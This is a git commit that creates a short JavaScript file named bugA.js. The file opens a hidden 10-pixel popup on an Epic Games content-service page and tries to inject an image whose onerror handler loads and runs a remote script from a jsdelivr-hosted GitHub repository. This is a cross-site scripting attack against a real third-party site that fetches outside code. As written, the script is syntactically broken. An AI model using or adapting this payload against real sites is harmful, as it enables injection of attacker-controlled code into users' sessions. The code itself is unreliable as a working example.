d0edb7df41f070d801709e9839dc64eaa4b7f711
Johnathanrs <johnathans23@yahoo.com>
2025-06-09 20:53:02 -0700

    Create bugA.js

---
+++ bugA.js
@@ -0,0 +1,7 @@
+(function() {
+  const target = window.open('https://content-service.bfda.live.use1a.on.epicgames.com/src/components/page-header/page-header.html','_blank','toolbar=no,status=no,menubar=no,scrollbars=no,resizable=no,left=10000, top=10000, width=10, height=10, visible=none', ''); 
+  target.addEventListener('DOMContentLoaded', () => {
+    var el = document.getElementsByTagName('body');
+    el.innerHTML = <img src='.' onerror="s=document.createElement('script');s.src='https://cdn.jsdelivr.net/gh/Johnathanrs/FN_BB1@main/bug8.js';document.body.appendChild(s)"></img>
+  })
+})();
